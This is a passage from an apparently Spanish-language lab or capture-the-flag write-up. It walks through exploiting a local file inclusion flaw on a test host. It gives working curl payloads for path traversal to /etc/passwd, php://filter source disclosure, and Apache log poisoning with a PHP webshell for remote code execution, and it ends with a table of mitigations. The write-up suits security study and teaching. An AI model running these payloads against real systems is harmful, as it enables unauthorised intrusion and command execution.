03 Explotación — LFI

// Descubrimiento del LFI

El primer intento revela el comportamiento exacto del servidor a través de sus mensajes de error:

bash — test LFI básico
curl -s "http://10.66.129.37/?view=dog/../../../etc/passwd"
respuesta — error revelador
Warning: include(dog/../../../etc/passwd.php): failed to open stream
# Ruta absoluta revelada:
in /var/www/html/index.php on line 24
⚠️
El servidor concatena .php automáticamente. También nos revela la ruta absoluta: /var/www/html/

// Bypass — parámetro ext vacío

El parámetro ext controla la extensión añadida. Pasando &ext= vacío eliminamos el .php:

bash — bypass ext + lectura /etc/passwd
curl -s "http://10.66.129.37/?view=dog/../../../../etc/passwd&ext="
# Output: root:x:0:0:root:/root:/bin/bash ...

// Lectura del código fuente con php://filter

bash — leer index.php en base64
curl -s "http://10.66.129.37/?view=php://filter/convert.base64-encode/resource=dog/../index.php&ext=" \
  | grep -oP 'go!\K[^<]+' | tr -d '\n ' | base64 -d
php — código fuente de index.php
// Filtro de seguridad (bypasseable):

04 Acceso Inicial — RCE via Log Poisoning

⚠️
El log de Apache debe estar limpio. Si Gobuster lo inundó previamente, PHP agotará memoria al incluirlo. Reiniciar la máquina antes de este paso.

// Paso 1 — Inyectar webshell en User-Agent

bash — envenenar access.log
curl -s "http://10.66.129.37/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# El payload PHP queda registrado en access.log

// Paso 2 — Verificar RCE

bash — ejecutar id via LFI
curl -s "http://10.66.129.37/?view=dog/../../../../../../var/log/apache2/access.log&ext=&cmd=id"

08 Vulnerabilidades & Mitigaciones

VulnerabilidadSeveridadMitigación
LFI en parámetro view Crítica Whitelist estricta de valores permitidos, nunca include(user_input)
Parámetro ext controlable Alta Nunca exponer parámetros que controlen extensiones de archivos
Log Poisoning via User-Agent Crítica Restringir permisos de lectura de logs, sanitizar User-Agent
sudo env NOPASSWD Crítica Auditar reglas sudo, principio de mínimo privilegio
Volumen Docker montado RW Crítica Montar volúmenes como :ro cuando sea posible
Script cron escribible desde contenedor Crítica Nunca exponer rutas con tareas privilegiadas del host a contenedores
